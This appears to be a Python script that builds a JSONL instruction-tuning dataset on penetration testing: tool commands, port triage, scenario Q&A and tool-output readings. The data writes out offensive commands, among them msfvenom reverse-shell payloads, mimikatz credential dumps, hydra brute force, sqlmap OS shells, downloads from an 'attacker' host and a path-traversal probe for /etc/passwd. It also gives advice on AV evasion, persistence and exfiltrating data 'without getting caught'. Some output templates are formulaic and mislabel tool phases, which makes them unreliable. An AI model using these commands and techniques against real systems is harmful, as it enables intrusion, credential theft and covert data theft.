#!/usr/bin/env python3
"""
Bulk Sample Generator - Systematic Variations
Generates remaining samples to reach 5000+ target
"""

import json
import random
from pathlib import Path
import itertools

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================
# COMMAND VARIATIONS
# ============================================

def generate_command_samples():
    """Generate command execution samples with variations"""
    samples = []
    
    commands = [
        # Nmap variations
        {"tool": "nmap", "cmd": "nmap -sS -T4 TARGET", "desc": "Fast SYN scan"},
        {"tool": "nmap", "cmd": "nmap -sU -top-ports 100 TARGET", "desc": "Top 100 UDP ports"},
        {"tool": "nmap", "cmd": "nmap -p 80,443,8080 -sV TARGET", "desc": "Web ports version scan"},
        {"tool": "nmap", "cmd": "nmap -sn 10.0.0.0/24", "desc": "Host discovery sweep"},
        {"tool": "nmap", "cmd": "nmap --script vuln TARGET", "desc": "Vulnerability scan"},
        {"tool": "nmap", "cmd": "nmap -O TARGET", "desc": "OS detection"},
        {"tool": "nmap", "cmd": "nmap -sV --version-intensity 5 TARGET", "desc": "Aggressive version scan"},
        {"tool": "nmap", "cmd": "nmap -6 TARGET", "desc": "IPv6 scan"},
        {"tool": "nmap", "cmd": "nmap --traceroute TARGET", "desc": "Traceroute"},
        {"tool": "nmap", "cmd": "nmap -f TARGET", "desc": "Fragmented packets"},
        
        # Gobuster variations
        {"tool": "gobuster", "cmd": "gobuster dir -u URL -w wordlist.txt", "desc": "Directory bruteforce"},
        {"tool": "gobuster", "cmd": "gobuster dir -u URL -w wordlist.txt -x php,asp,html", "desc": "With extensions"},
        {"tool": "gobuster", "cmd": "gobuster dns -d domain.com -w subdomains.txt", "desc": "Subdomain enumeration"},
        {"tool": "gobuster", "cmd": "gobuster vhost -u URL -w vhosts.txt", "desc": "Virtual host discovery"},
        {"tool": "gobuster", "cmd": "gobuster dir -u URL -w wordlist.txt -t 50", "desc": "High thread count"},
        
        # Nikto variations
        {"tool": "nikto", "cmd": "nikto -h TARGET", "desc": "Basic web scan"},
        {"tool": "nikto", "cmd": "nikto -h TARGET -ssl", "desc": "HTTPS scan"},
        {"tool": "nikto", "cmd": "nikto -h TARGET -o report.html -Format htm", "desc": "HTML output"},
        {"tool": "nikto", "cmd": "nikto -h TARGET -Tuning 123bde", "desc": "Custom scan tuning"},
        
        # SMB tools
        {"tool": "smbclient", "cmd": "smbclient -L //TARGET -N", "desc": "List shares (null session)"},
        {"tool": "smbclient", "cmd": "smbclient //TARGET/share -U user%pass", "desc": "Access share"},
        {"tool": "smbmap", "cmd": "smbmap -H TARGET", "desc": "SMB share enumeration"},
        {"tool": "smbmap", "cmd": "smbmap -H TARGET -u user -p pass -d domain", "desc": "Authenticated enum"},
        {"tool": "enum4linux", "cmd": "enum4linux -a TARGET", "desc": "Full SMB enumeration"},
        {"tool": "rpcclient", "cmd": "rpcclient -U '' TARGET", "desc": "RPC null session"},
        
        # Password attacks
        {"tool": "hydra", "cmd": "hydra -l admin -P wordlist.txt TARGET ssh", "desc": "SSH brute force"},
        {"tool": "hydra", "cmd": "hydra -L users.txt -P pass.txt TARGET ftp", "desc": "FTP brute force"},
        {"tool": "hydra", "cmd": "hydra -l admin -P wordlist.txt TARGET -s 8080 http-get /admin", "desc": "HTTP basic auth"},
        {"tool": "medusa", "cmd": "medusa -h TARGET -u admin -P wordlist.txt -M ssh", "desc": "SSH with Medusa"},
        {"tool": "john", "cmd": "john --wordlist=rockyou.txt hashes.txt", "desc": "Dictionary attack"},
        {"tool": "john", "cmd": "john --format=NT hashes.txt", "desc": "NTLM crack"},
        
        # Web exploitation
        {"tool": "sqlmap", "cmd": "sqlmap -u 'URL?id=1' --dbs", "desc": "SQLi database enum"},
        {"tool": "sqlmap", "cmd": "sqlmap -u 'URL?id=1' --os-shell", "desc": "SQLi to shell"},
        {"tool": "sqlmap", "cmd": "sqlmap -r request.txt --batch", "desc": "From Burp request"},
        {"tool": "wfuzz", "cmd": "wfuzz -c -z file,wordlist.txt URL/FUZZ", "desc": "Web fuzzing"},
        {"tool": "wfuzz", "cmd": "wfuzz -c -z file,wordlist.txt -H 'Cookie: x=FUZZ' URL", "desc": "Cookie fuzzing"},
        
        # Network utilities
        {"tool": "nc", "cmd": "nc -lvnp 4444", "desc": "Netcat listener"},
        {"tool": "nc", "cmd": "nc -nv TARGET PORT", "desc": "Netcat connect"},
        {"tool": "tcpdump", "cmd": "tcpdump -i eth0 -w capture.pcap", "desc": "Packet capture"},
        {"tool": "tcpdump", "cmd": "tcpdump -i eth0 port 80", "desc": "HTTP traffic capture"},
        {"tool": "wireshark", "cmd": "wireshark -i eth0", "desc": "GUI packet analysis"},
        
        # Post-exploitation
        {"tool": "linpeas", "cmd": "./linpeas.sh", "desc": "Linux privesc enumeration"},
        {"tool": "winpeas", "cmd": "winpeas.exe", "desc": "Windows privesc enumeration"},
        {"tool": "mimikatz", "cmd": "sekurlsa::logonpasswords", "desc": "Dump credentials"},
        {"tool": "mimikatz", "cmd": "lsadump::sam", "desc": "Dump SAM"},
        {"tool": "mimikatz", "cmd": "kerberos::list", "desc": "List Kerberos tickets"},
        
        # Metasploit one-liners
        {"tool": "msfvenom", "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe", "desc": "Windows reverse shell"},
        {"tool": "msfvenom", "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf", "desc": "Linux reverse shell"},
        {"tool": "msfvenom", "cmd": "msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php", "desc": "PHP web shell"},
        
        # DNS tools
        {"tool": "dig", "cmd": "dig axfr @ns.domain.com domain.com", "desc": "Zone transfer attempt"},
        {"tool": "dig", "cmd": "dig +short domain.com", "desc": "Quick DNS lookup"},
        {"tool": "dnsrecon", "cmd": "dnsrecon -d domain.com -t std", "desc": "DNS enumeration"},
        {"tool": "fierce", "cmd": "fierce -dns domain.com", "desc": "DNS reconnaissance"},
        
        # File transfer
        {"tool": "wget", "cmd": "wget http://attacker/file -O /tmp/file", "desc": "Download file"},
        {"tool": "curl", "cmd": "curl -o file http://attacker/file", "desc": "Download with curl"},
        {"tool": "scp", "cmd": "scp file user@host:/path/", "desc": "Secure copy"},
        {"tool": "python", "cmd": "python3 -m http.server 8000", "desc": "Simple HTTP server"},
        
        # AD tools
        {"tool": "bloodhound-python", "cmd": "bloodhound-python -c all -d domain.local -u user -p pass", "desc": "BloodHound collection"},
        {"tool": "ldapsearch", "cmd": "ldapsearch -x -h DC -b 'dc=domain,dc=local'", "desc": "LDAP enumeration"},
        {"tool": "kerbrute", "cmd": "kerbrute userenum -d domain.local users.txt", "desc": "Kerberos user enum"},
        {"tool": "impacket", "cmd": "GetUserSPNs.py domain/user:pass -dc-ip DC -request", "desc": "Kerberoast"},
    ]
    
    for cmd_data in commands:
        output = f"""Command Analysis: {cmd_data["tool"]}

[COMMAND]
{cmd_data["cmd"]}

[PURPOSE]
{cmd_data["desc"]}

[USAGE CONTEXT]
This command is typically used during {"reconnaissance" if cmd_data["tool"] in ["nmap", "gobuster", "nikto", "dig", "dnsrecon"] else "exploitation" if cmd_data["tool"] in ["sqlmap", "hydra", "msfvenom"] else "enumeration" if cmd_data["tool"] in ["enum4linux", "smbmap", "bloodhound-python"] else "post-exploitation"} phase.

[OUTPUT]
The output will include {"open ports and services" if "nmap" in cmd_data["tool"] else "discovered directories" if "gobuster" in cmd_data["tool"] else "vulnerabilities found" if cmd_data["tool"] in ["nikto", "sqlmap"] else "enumerated data"}.

[DOCUMENTATION]
- Record command and output
- Note any interesting findings
- Consider follow-up actions"""
        
        samples.append({
            "instruction": f"How do I use {cmd_data['tool']} to {cmd_data['desc'].lower()}?",
            "input": f"Need to {cmd_data['desc'].lower()} using {cmd_data['tool']}.",
            "output": output.strip()
        })
    
    return samples


def generate_port_analysis_samples():
    """Generate port analysis samples"""
    samples = []
    
    ports = [
        (21, "FTP", "File Transfer Protocol - check for anonymous access, version vulnerabilities"),
        (22, "SSH", "Secure Shell - check for weak credentials, version vulnerabilities like old OpenSSH"),
        (23, "Telnet", "Unencrypted remote access - credentials transmitted in clear text"),
        (25, "SMTP", "Email - check for open relay, user enumeration via VRFY/EXPN"),
        (53, "DNS", "Domain Name System - check for zone transfer, DNS poisoning potential"),
        (80, "HTTP", "Web server - run directory brute force, look for vulnerabilities"),
        (110, "POP3", "Email retrieval - credentials in clear text, brute force"),
        (111, "RPC", "Remote Procedure Call - enumerate services, NFS shares"),
        (135, "MSRPC", "Microsoft RPC - interface enumeration, potential exploits"),
        (139, "NetBIOS", "Windows networking - enumerate shares, null sessions"),
        (143, "IMAP", "Email - similar to POP3, check for vulnerabilities"),
        (389, "LDAP", "Directory services - enumerate AD information"),
        (443, "HTTPS", "Secure web - analyze SSL/TLS, all HTTP tests apply"),
        (445, "SMB", "File sharing - enumerate shares, check for EternalBlue"),
        (512, "rexec", "Remote execution - if open, serious risk"),
        (513, "rlogin", "Remote login - trust-based auth, potential bypass"),
        (514, "RSH", "Remote shell - no encryption, trust-based"),
        (1433, "MSSQL", "Microsoft SQL Server - brute force, xp_cmdshell"),
        (1521, "Oracle", "Oracle database - TNS listener, brute force"),
        (2049, "NFS", "Network File System - check exports, mount shares"),
        (3306, "MySQL", "MySQL database - brute force, UDF for RCE"),
        (3389, "RDP", "Remote Desktop - brute force, BlueKeep vulnerability"),
        (5432, "PostgreSQL", "PostgreSQL database - brute force, file read"),
        (5900, "VNC", "Virtual Network Computing - auth bypass, brute force"),
        (5985, "WinRM", "Windows Remote Management - PowerShell remoting"),
        (6379, "Redis", "Redis database - no auth by default, config abuse"),
        (8080, "HTTP-Alt", "Alternative HTTP - often development/proxy servers"),
        (8443, "HTTPS-Alt", "Alternative HTTPS - common for admin interfaces"),
        (27017, "MongoDB", "MongoDB - no auth by default, data exposure"),
    ]
    
    for port, service, analysis in ports:
        output = f"""Port Analysis: {port}/{service}

[PORT]
{port}/tcp

[SERVICE]
{service}

[SECURITY ANALYSIS]
{analysis}

[ENUMERATION STEPS]
1. Confirm service: nmap -sV -p {port} TARGET
2. Version check: Search for version-specific vulnerabilities
3. {"Authentication test" if port in [21,22,23,25,110,143,1433,1521,3306,3389,5432,5900,5985] else "Functionality test"}
4. Exploitation if vulnerable

[COMMON VULNERABILITIES]
- Default/weak credentials
- Outdated service versions
- Misconfigurations
- Known CVEs for this service

[TOOLS]
{"nmap scripts: nmap --script " + service.lower() + "* TARGET" if service.lower() not in ["netbios", "msrpc", "http-alt"] else "Specialized tools based on service type"}

[NEXT STEPS]
Document findings and prioritize based on risk."""
        
        samples.append({
            "instruction": f"What should I do when I find port {port} ({service}) open?",
            "input": f"Found port {port} open during scan. Service appears to be {service}.",
            "output": output.strip()
        })
    
    return samples


def generate_scenario_qa_samples():
    """Generate Q&A for common scenarios"""
    samples = []
    
    scenarios = [
        ("I have a shell but it keeps dying", "Unstable shells are common. Solutions: 1) Upgrade to a fully interactive TTY (python -c 'import pty;pty.spawn(\"/bin/bash\")'). 2) Set up a more reliable callback mechanism. 3) Add persistence early. 4) Check for monitoring/killing processes."),
        ("I can't find any vulnerabilities", "Expand your scope: 1) Check all ports thoroughly. 2) Look at application logic flaws. 3) Test authentication thoroughly. 4) Check for default credentials. 5) Review configuration files. 6) Sometimes the path is through users (phishing if in scope)."),
        ("The exploit requires a specific version but I can't determine it", "Try: 1) Banner grabbing with nmap -sV. 2) Trigger error pages that reveal versions. 3) Check default files (/readme, /version). 4) Look at HTTP headers. 5) Analyze behavior differences between versions."),
        ("I need to transfer files but no outbound connection", "Options: 1) DNS exfiltration if DNS works. 2) ICMP tunneling if ping works. 3) Write to web directory and fetch via HTTP. 4) Use existing protocols that ARE allowed. 5) Manual transfer via clipboard/screen."),
        ("Credentials work but can't get shell", "Try: 1) Different protocols (SSH, WinRM, RDP). 2) Impacket tools (wmiexec, smbexec, psexec). 3) Web-based admin panels. 4) Check if credentials work elsewhere. 5) Consider the user may have restricted shell access."),
        ("Running out of time on engagement", "Prioritize: 1) Focus on highest-risk findings. 2) Document what you have. 3) Set up automated scanning to continue. 4) Communicate with client about limitations. 5) Provide recommendations for future testing."),
        ("Found sensitive data but not sure if I should touch it", "Document but DON'T exfiltrate: 1) Screenshot showing access (redacted). 2) Count/describe data without viewing details. 3) Note the path taken to access it. 4) Report immediately if it's a critical finding."),
        ("Target system is very hardened", "Advanced techniques: 1) Look for logic flaws not covered by hardening. 2) Test trust relationships. 3) Check backup systems which may be less hardened. 4) Third-party integrations often have weaknesses. 5) Supply chain attack vectors."),
        ("My IP got blocked", "Recovery steps: 1) If expected, use backup VPN/IPs. 2) Slow down your testing. 3) Use more targeted scans. 4) Consider if you triggered any false positives. 5) Communicate with client if persistent block."),
        ("Client asking for live demo of exploit", "Prepare carefully: 1) Test in controlled environment first. 2) Have rollback plan. 3) Document exactly what you'll do. 4) Get written approval for live demo. 5) Have sanitized evidence as backup if live fails."),
    ]
    
    for question, answer in scenarios:
        samples.append({
            "instruction": question,
            "input": "During an authorized penetration test.",
            "output": answer
        })
    
    return samples


def generate_technique_qa_samples():
    """Generate technique-focused Q&A"""
    samples = []
    
    techniques = [
        ("How do I pivot through a compromised host?", "Pivoting methods: 1) SSH tunneling: ssh -D 9050 user@pivot for SOCKS proxy. 2) Chisel for HTTP tunnels. 3) Ligolo-ng for more complex scenarios. 4) Metasploit autoroute with route add. 5) ProxyChains through established tunnels."),
        ("What's the best way to maintain persistence?", "Persistence varies by target: Windows - scheduled tasks, registry run keys, services. Linux - cron jobs, ~/.bashrc, systemd services. Web - webshell, modified config files. Use multiple methods for redundancy."),
        ("How do I avoid AV detection?", "AV evasion techniques: 1) Custom compile payloads. 2) Obfuscation tools. 3) Living off the land binaries (LOLBins). 4) In-memory execution. 5) Encrypted payloads with custom decrypters. Test against target AV in lab first."),
        ("How do I safely test for DoS vulnerabilities?", "DoS testing safely: 1) Get explicit written permission. 2) Test during maintenance windows. 3) Start with single requests, increase gradually. 4) Have direct line to ops team. 5) Document everything. 6) Use controlled resource exhaustion."),
        ("How do I extract data without getting caught?", "Stealthy exfil: 1) Slow and low - small chunks over time. 2) Encrypt data before exfil. 3) Use allowed protocols (HTTPS, DNS). 4) Avoid known bad patterns. 5) Consider what's being logged. 6) Data compression."),
        ("What should I do first after getting initial access?", "Initial access checklist: 1) Document how you got in. 2) Stabilize access (persistence if allowed). 3) Enumerate local system. 4) Check privileges. 5) Look for easy escalation paths. 6) Begin internal recon quietly."),
        ("How do I handle multi-factor authentication?", "MFA challenges: 1) Try MFA bypass techniques (token replay, etc). 2) Target systems without MFA. 3) Social engineering (if in scope). 4) Session token theft after auth. 5) Explore admin exceptions. 6) Check for MFA fatigue attack potential."),
        ("How do I test thick client applications?", "Thick client testing: 1) Proxy traffic through Burp. 2) Decompile if possible (Java, .NET). 3) Monitor filesystem/registry. 4) Check for insecure storage. 5) Test client-side validation bypass. 6) Analyze network communication."),
        ("What's the best approach for API testing?", "API testing approach: 1) Map all endpoints (swagger/openapi if available). 2) Test authentication/authorization. 3) Parameter manipulation. 4) Rate limiting checks. 5) Injection points. 6) Business logic flaws. Use Postman/Burp for API-focused testing."),
        ("How do I document my testing effectively?", "Documentation best practices: 1) Real-time notes (CherryTree, Obsidian). 2) Screenshot everything significant. 3) Log all commands (script command on Linux). 4) Timestamp activities. 5) Organize by target/phase. 6) Regular backup of notes."),
    ]
    
    for question, answer in techniques:
        samples.append({
            "instruction": question,
            "input": "",
            "output": answer
        })
    
    return samples


def generate_tool_output_samples():
    """Generate tool output interpretation samples"""
    samples = []
    
    outputs = [
        {
            "tool": "nmap",
            "output": "22/tcp filtered ssh",
            "interpretation": "Port 22 is filtered, meaning a firewall is blocking access. The service is likely running but not accessible from your location. Try from different source IP or check if VPN/internal access is needed."
        },
        {
            "tool": "nmap",
            "output": "80/tcp open http Apache httpd 2.4.49",
            "interpretation": "Apache 2.4.49 is vulnerable to path traversal (CVE-2021-41773) and potentially RCE (CVE-2021-42013). This is a critical finding - test immediately with: curl 'http://target/cgi-bin/.%2e/%2e%2e/etc/passwd'"
        },
        {
            "tool": "sqlmap",
            "output": "[INFO] target URL appears to be UNION query injectable",
            "interpretation": "UNION-based SQLi confirmed. This allows appending additional SELECT queries. Use --union-cols to determine columns, then extract data with --dump or --dump-all. High severity finding."
        },
        {
            "tool": "hydra",
            "output": "[22][ssh] host: 10.0.0.1 login: admin password: admin123",
            "interpretation": "Valid SSH credentials found: admin/admin123. Immediately test: ssh admin@10.0.0.1. This is a critical finding - weak/default credentials. Document and proceed with post-exploitation."
        },
        {
            "tool": "gobuster",
            "output": "/backup (Status: 200) [Size: 0]",
            "interpretation": "Backup directory found and accessible. Even though size is 0, explore further: /backup/*, /backup.zip, /backup.tar.gz. Backup directories often contain sensitive data or old code."
        },
        {
            "tool": "nikto",
            "output": "X-Frame-Options header is not present",
            "interpretation": "Missing X-Frame-Options allows clickjacking attacks. Low severity but should be reported. The site can be embedded in an iframe for UI redressing attacks."
        },
        {
            "tool": "enum4linux",
            "output": "Got OS info for 10.0.0.1 from smbclient: Domain=[CORP] OS=[Windows Server 2008 R2]",
            "interpretation": "Windows Server 2008 R2 detected - end of life OS with many unpatched vulnerabilities. Check for MS17-010 (EternalBlue), MS08-067. High priority target due to legacy status."
        },
        {
            "tool": "BloodHound",
            "output": "Found 3 attack paths from owned principals to Domain Admins",
            "interpretation": "BloodHound found privilege escalation paths. Review each path for feasibility. Common paths include: AdminTo edges (local admin), group memberships, ACL abuse. Prioritize shortest/easiest path."
        },
    ]
    
    for item in outputs:
        samples.append({
            "instruction": f"What does this {item['tool']} output mean?",
            "input": f"Tool: {item['tool']}\nOutput: {item['output']}",
            "output": item['interpretation']
        })
    
    return samples


def main():
    """Generate bulk samples"""
    print("📦 Generating bulk samples...")
    
    all_samples = []
    
    generators = [
        ("commands", generate_command_samples),
        ("port_analysis", generate_port_analysis_samples),
        ("scenario_qa", generate_scenario_qa_samples),
        ("technique_qa", generate_technique_qa_samples),
        ("tool_outputs", generate_tool_output_samples),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name}...")
        samples = generator()
        all_samples.extend(samples)
        
        # Save category file
        category_file = OUTPUT_DIR / f"{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples saved to {category_file.name}")
    
    # Save combined
    combined_file = OUTPUT_DIR / "bulk_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} bulk samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
